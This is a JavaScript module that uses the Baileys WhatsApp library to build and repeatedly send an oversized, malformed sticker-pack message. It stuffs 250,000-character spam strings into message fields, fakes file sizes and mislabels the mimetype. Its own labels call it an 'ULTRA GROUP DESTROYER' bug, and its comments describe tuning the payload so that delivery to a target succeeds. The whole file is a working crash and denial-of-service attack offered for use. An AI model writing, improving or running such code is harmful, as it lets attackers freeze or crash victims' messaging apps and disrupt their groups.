
const { generateWAMessageFromContent, delay } = require('@whiskeysockets/baileys');
const { getSuperPayload } = require('./SuperPayload');

function createSticker(fileName) {
  return {
    fileName,
    isAnimated: false,
    isLottie: true,
    mimetype: "application/pdf",
    emojis: ["🀄"],
    accessibilityLabel: "ROBIN BUG"
  };
}

async function SuperGroupBug(SYxS7, target) {
    try {
        // Optimized payload size to 250,000 characters for stability
        // 1M was causing 'Reason: 500' connection drops
        const superSpam = getSuperPayload(250000); 
        const stickers = Array(20).fill(createSticker("FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp"));
        
        const payload = {
            stickerPackMessage: {
                stickerPackId: "ROBIN-ULTRA-BUG",
                name: superSpam,
                publisher: "KING ROBIN",
                packDescription: superSpam,
                stickers: stickers,
                fileLength: "999999999",
                stickerPackSize: "999999999",
                contextInfo: {
                    externalAdReply: {
                        title: "💀 ULTRA GROUP DESTROYER 💀",
                        body: superSpam,
                        showAdAttribution: true,
                        renderLargerThumbnail: true,
                        thumbnailUrl: "https://files.catbox.moe/tlbp3k.jpg"
                    },
                    quotedMessage: {
                        groupInviteMessage: {
                            groupName: superSpam,
                            groupJid: "561611-1627579259@g.us",
                            inviteCode: "h+64P9RhJDzgXSPf",
                            inviteExpiration: 32503680000,
                            caption: superSpam
                        }
                    }
                }
            }
        };

        // Repeatedly send the optimized super message
        for (let i = 0; i < 12; i++) {
            try {
                await SYxS7.relayMessage(target, payload, {
                    participant: { jid: target }
                });
                await delay(400); // Slightly increased delay for stability
            } catch (e) {
                console.log("Relay attempt failed, skipping...");
            }
        }
    } catch (error) {
        console.error("SuperGroupBug optimized failed:", error.message);
    }
}

module.exports = { SuperGroupBug };
